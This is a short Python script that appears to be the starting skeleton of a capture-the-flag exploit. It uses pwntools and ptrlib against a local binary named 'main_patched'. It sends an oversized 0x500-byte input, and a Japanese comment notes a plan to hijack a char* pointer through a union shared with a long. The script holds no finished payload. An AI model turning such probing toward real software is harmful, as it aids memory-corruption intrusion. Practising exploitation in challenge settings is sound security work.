#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./main_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


# Variable構造体内の共用体で、char*とlongが領域を共有しているので、なんとかしてchar*ポインタを操ることができれば嬉しそう
def main():
    io = connect()

    def sla(delim: bytes, data: bytes):
        io.sendlineafter(delim, data)
        return

    # input(">> ")
    # sla(b"> ", b"$var0=hello")
    # sla(b"> ", b"$var0")
    sla(b"> ", b"A" * 0x500)

    io.interactive()
    return


if __name__ == "__main__":
    main()
